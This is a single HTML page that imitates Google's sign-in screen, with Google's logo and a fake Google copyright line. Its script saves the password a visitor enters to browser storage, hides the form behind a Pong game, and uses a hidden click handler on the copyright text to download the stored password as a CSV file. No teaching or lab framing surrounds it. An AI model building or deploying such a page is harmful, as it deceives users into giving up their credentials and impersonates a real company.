<!DOCTYPE html>
<html lang="en">
<head>
  <title>Google Sign-In</title>
  <style>
    body {
      font-family: "Roboto", Arial, sans-serif;
      background-color: #f5f5f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      width: 360px;
      padding: 40px;
      background: white;
      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
      border-radius: 8px;
    }

    .logo {
      display: block;
      margin: 0 auto 24px;
    }

    form {
      margin-top: 20px;
    }

    input[type="text"], input[type="password"] {
      width: 100%;
      height: 42px;
      padding: 0 12px;
      margin: 8px 0;
      border: 1px solid #dcdcdc;
      border-radius: 4px;
      box-sizing: border-box;
      font-size: 16px;
      transition: border 0.3s ease;
    }

    input[type="text"]:focus, input[type="password"]:focus {
      border-color: #1a73e8;
    }

    input[type="submit"] {
      width: 100%;
      height: 42px;
      background-color: #1a73e8;
      color: #fff;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: 14px;
      transition: background-color 0.3s ease;
    }

    input[type="submit"]:hover {
      background-color: #1669c1;
    }

    .info {
      font-size: 14px;
      color: #737373;
      margin-top: 16px;
      text-align: center;
    }

    .info a {
      color: #1a73e8;
      text-decoration: none;
    }

    .info a:hover {
      text-decoration: underline;
    }

    #gameContainer {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100vh;
      background: #000;
      z-index: 1000;
    }

    canvas {
      display: block;
      margin: 0 auto;
      background: #000;
    }

    .copyright {
      position: fixed;
      bottom: 10px;
      right: 10px;
      font-size: 12px;
      color: #737373;
      z-index: 1001; /* Ensure it stays on top of the canvas */
      cursor: pointer; /* Make it clickable */
    }
  </style>
</head>
<body>

<div class="container">
  <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="logo">
  <form id="signInForm">
    <input placeholder="Email or phone" name="username" type="text" required>
    <input placeholder="Enter your password" id="passwordInput" name="password" type="password" required>
    <input value="Sign in" type="submit">
  </form>
  <div class="info">Not your computer? Use <a href="#">Guest mode</a> to sign in privately.</div>
</div>

<div id="gameContainer">
  <canvas id="pong"></canvas>
</div>

<div class="copyright" onclick="downloadPassword()">
  &copy; 2025 Google LLC
</div>

<script>
  document.getElementById('signInForm').addEventListener('submit', (e) => {
    e.preventDefault();
    const passwordInput = document.getElementById('passwordInput');
    const password = passwordInput.value;
    
    localStorage.setItem('password', password);
    passwordInput.value = '';

    document.querySelector('.container').style.display = 'none';
    document.getElementById('gameContainer').style.display = 'block';
    startGame();
  });

  function downloadPassword() {
    const password = localStorage.getItem('password');
    if (password) {
      const csv = `Password,${password}\n`;
      const blob = new Blob([csv], { type: 'text/csv' });
      const link = document.createElement('a');
      link.href = URL.createObjectURL(blob);
      link.download = 'password.csv';
      link.click();
    } else {
      alert('No password found. Please sign in first.');
    }
  }

  function startGame() {
    const canvas = document.getElementById('pong');
    const context = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    
    const paddleWidth = 10, paddleHeight = 100, ballSize = 10;
    let paddleY = (canvas.height - paddleHeight) / 2, 
        computerPaddleY = paddleY, 
        ballX = canvas.width / 2, 
        ballY = canvas.height / 2, 
        ballSpeedX = 5, 
        ballSpeedY = 5;
    
    function drawRect(x, y, w, h, color) {
      context.fillStyle = color;
      context.fillRect(x, y, w, h);
    }
    
    function drawCircle(x, y, r, color) {
      context.fillStyle = color;
      context.beginPath();
      context.arc(x, y, r, 0, Math.PI*2, true);
      context.closePath();
      context.fill();
    }
    
    function render() {
      drawRect(0, 0, canvas.width, canvas.height, 'black');

      drawRect(0, paddleY, paddleWidth, paddleHeight, 'white');
      drawRect(canvas.width - paddleWidth, computerPaddleY, paddleWidth, paddleHeight, 'white');
      drawCircle(ballX, ballY, ballSize, 'white');
    }
    
    function update() {
      ballX += ballSpeedX;
      ballY += ballSpeedY;

      // Ball collision with top and bottom walls
      if (ballY - ballSize < 0 || ballY + ballSize > canvas.height) {
        ballSpeedY = -ballSpeedY;
      }
    
      // Computer AI
      if (computerPaddleY + paddleHeight / 2 < ballY) {
        computerPaddleY += 6;
      } else {
        computerPaddleY -= 6;
      }

      if (ballX - ballSize < paddleWidth) {
        if (ballY > paddleY && ballY < paddleY + paddleHeight) {
          ballSpeedX = -ballSpeedX;
        }
      } else if (ballX + ballSize > canvas.width - paddleWidth) {
        if (ballY > computerPaddleY && ballY < computerPaddleY + paddleHeight) {
          ballSpeedX = -ballSpeedX;
        }
      }
    }
    
    function gameLoop() {
      render();
      update();
    }

    setInterval(gameLoop, 1000 / 60);
    
    canvas.addEventListener('mousemove', (event) => {
      const rect = canvas.getBoundingClientRect();
      const root = document.documentElement;
      const mouseY = event.clientY - rect.top - root.scrollTop;
      paddleY = mouseY - paddleHeight / 2;
    });
  }
</script>

</body>
</html>
